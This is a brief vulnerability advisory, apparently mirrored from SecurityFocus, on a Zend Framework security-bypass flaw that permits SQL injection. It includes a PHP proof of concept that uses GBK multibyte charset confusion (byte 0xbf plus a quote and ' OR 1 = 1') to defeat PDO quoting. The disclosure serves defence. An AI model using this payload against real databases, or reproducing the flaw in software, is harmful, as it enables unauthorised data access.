source: https://www.securityfocus.com/bid/47919/info

Zend Framework is prone to a security-bypass vulnerability.

An attacker can leverage this vulnerability to bypass certain security restrictions. Successful exploits may allow attackers to exploit SQL-injection vulnerabilities.

Zend Framework versions prior to 1.10.9 and 1.11.6 are vulnerable.

$dsn = 'mysql:dbname=INFORMATION_SCHEMA;host=127.0.0.1;charset=GBK';
$pdo = new PDO($dsn, $user, $pass);
$pdo->exec('SET NAMES GBK');
$string = chr(0xbf) . chr(0x27) . ' OR 1 = 1; /*';
$sql = "SELECT TABLE_NAME
            FROM INFORMATION_SCHEMA.TABLES
            WHERE TABLE_NAME LIKE ".$pdo->quote($string).";";
$stmt = $pdo->query($sql);
var_dump($stmt->rowCount());